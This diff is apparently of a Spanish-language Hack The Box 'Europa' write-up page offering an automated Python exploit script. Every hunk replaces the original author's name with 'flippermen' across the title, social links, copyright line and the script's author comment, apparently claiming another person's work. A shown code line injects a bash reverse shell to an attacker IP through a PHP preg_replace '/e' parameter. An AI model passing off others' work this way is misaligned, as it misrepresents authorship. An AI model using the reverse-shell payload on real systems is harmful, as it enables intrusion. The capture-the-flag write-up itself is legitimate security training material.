@@ -9,14 +9,14 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>Europa - Hack The Box - s4vitar.io</title>
+<!-- begin _includes/seo.html --><title>Europa - Hack The Box - flippermen.io</title>
 <meta name="description" content="Una máquina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script Autopwn que nos habíamos configurado en Python, donde tras su ejecución se nos automatiza la intrusión y la escalada de privilegios mediante el uso de la librería pwn.">
 
 
 
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
-<meta property="og:site_name" content="s4vitar.io">
+<meta property="og:site_name" content="flippermen.io">
 <meta property="og:title" content="Europa - Hack The Box">
 <meta property="og:url" content="http://localhost:4000/europa-hackthebox/">
 
@@ -54,7 +54,7 @@
     {
       "@context": "https://schema.org",
       "@type": "Person",
-      "name": "S4vitar",
+      "name": "flippermen",
       "url": "http://localhost:4000",
       "sameAs": null
     }
@@ -69,7 +69,7 @@
 <!-- end _includes/seo.html -->
 
 
-<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="s4vitar.io Feed">
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="flippermen.io Feed">
 
 <!-- https://t.co/dKP3o1e -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -192,14 +192,14 @@
       
 
       
-        <img src="/assets/images/avatar.png" alt="S4vitar" itemprop="image">
+        <img src="/assets/images/avatar.png" alt="flippermen" itemprop="image">
       
     </div>
   
 
   <div class="author__content">
     
-      <h3 class="author__name" itemprop="name">S4vitar</h3>
+      <h3 class="author__name" itemprop="name">flippermen</h3>
     
     
       <p class="author__bio" itemprop="description">
@@ -234,7 +234,7 @@
 
       
         <li>
-          <a href="https://twitter.com/s4vitar" itemprop="sameAs" rel="nofollow noopener noreferrer">
+          <a href="https://twitter.com/flippermen" itemprop="sameAs" rel="nofollow noopener noreferrer">
             <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
           </a>
         </li>
@@ -246,7 +246,7 @@
 
       
         <li>
-          <a href="https://www.linkedin.com/in/s4vitar" itemprop="sameAs" rel="nofollow noopener noreferrer">
+          <a href="https://www.linkedin.com/in/flippermen" itemprop="sameAs" rel="nofollow noopener noreferrer">
             <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
           </a>
         </li>
@@ -262,7 +262,7 @@
 
       
         <li>
-          <a href="https://github.com/s4vitar" itemprop="sameAs" rel="nofollow noopener noreferrer">
+          <a href="https://github.com/flippermen" itemprop="sameAs" rel="nofollow noopener noreferrer">
             <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
           </a>
         </li>
@@ -285,7 +285,7 @@
       
         
           <li>
-            <a href="https://youtube.com/c/s4vitar" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <a href="https://youtube.com/c/flippermen" itemprop="sameAs" rel="nofollow noopener noreferrer">
               <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> YouTube
             </a>
           </li>
@@ -357,7 +357,7 @@
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
 #coding: utf-8
 </span>
-<span class="c1"># Author: s4vitar https://www.youtube.com/watch?v=wOm4OOBLbys
+<span class="c1"># Author: flippermen https://www.youtube.com/watch?v=wOm4OOBLbys
 </span>
 <span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">urllib3</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">threading</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -409,7 +409,7 @@
   <span class="n">openvpn_config_file_data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'pattern'</span> <span class="p">:</span> <span class="s">'/ip_address/e'</span><span class="p">,</span>
    <span class="s">'ipaddress'</span> <span class="p">:</span> <span class="s">"""system("bash -c 'bash -i &gt; /dev/tcp/10.10.14.55/443 0&gt;&amp;1'")"""</span><span class="p">,</span>
-   <span class="s">'text'</span> <span class="p">:</span> <span class="s">'ip_address = s4vitar'</span>
+   <span class="s">'text'</span> <span class="p">:</span> <span class="s">'ip_address = flippermen'</span>
   <span class="p">}</span>
 
   <span class="n">p2</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Enviando petición al servidor"</span><span class="p">)</span>
@@ -576,7 +576,7 @@
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2020 S4vitar</div>
+<div class="page__footer-copyright">&copy; 2020 flippermen</div>
 
       </footer>
     </div>
